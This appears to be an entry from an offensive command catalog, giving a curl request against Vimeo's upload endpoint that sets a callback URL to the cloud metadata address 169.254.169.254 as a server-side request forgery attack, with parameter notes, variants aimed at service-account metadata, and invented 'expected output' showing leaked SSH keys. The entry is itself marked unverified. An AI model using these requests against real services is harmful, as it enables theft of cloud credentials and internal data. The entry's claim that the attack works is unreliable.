---
data: >-
  curl -X POST -H "Authorization: Bearer YOUR_VIMEO_TOKEN" -F
  "file=@dummyfile.txt" -F
  "callback_url=http://169.254.169.254/computeMetadata/v1/"
  https://upload.vimeo.com/files
tags:
  - ssrf
  - web-exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Web
id: b4759612-cf55-4058-a07b-5cec3d003da6
created_at: '2025-12-14T17:28:36.516Z'
updated_at: '2025-12-14T17:28:36.516Z'
verified: false
validated: true
submitted: true
---
# curl-vimeo-ssrf-upload

## Command

```bash
curl -X POST -H "Authorization: Bearer YOUR_VIMEO_TOKEN" -F "file=@dummyfile.txt" -F "callback_url=http://169.254.169.254/computeMetadata/v1/" https://upload.vimeo.com/files
```

## Description

This command uses curl to perform a POST request to Vimeo's upload endpoint, attaching a dummy file and a malicious callback URL targeting Google Cloud's internal metadata service. It exploits SSRF by tricking the server into fetching internal resources, potentially leaking sensitive data like SSH keys in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST for upload | Yes |
| `-H "Authorization: Bearer YOUR_VIMEO_TOKEN"` | Provides authentication token for Vimeo API access | Yes |
| `-F "file=@dummyfile.txt"` | Attaches a dummy file to mimic legitimate upload | Yes |
| `-F "callback_url=http://169.254.169.254/computeMetadata/v1/"` | Malicious parameter injecting internal URL for SSRF | Yes |
| `https://upload.vimeo.com/files` | Target Vimeo upload endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Authorization: Bearer token123" -F "file=@test.txt" -F "callback_url=http://internal.example/" https://upload.vimeo.com/files
```

### Advanced Usage

```bash
curl -X POST -H "Authorization: Bearer token123" -H "Content-Type: multipart/form-data" -F "file=@test.txt" -F "callback_url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/" -v https://upload.vimeo.com/files
```

## Expected Output

A JSON response from Vimeo that may include leaked internal data if SSRF succeeds, such as {"error": "internal data: ssh-keys: user:ssh-rsa AAA..."} or metadata details. Verbose mode (-v) shows request/response headers for debugging.

## Related

- [[Related Procedure: Exploit-SSRF-in-Vimeo-Upload-Function]]
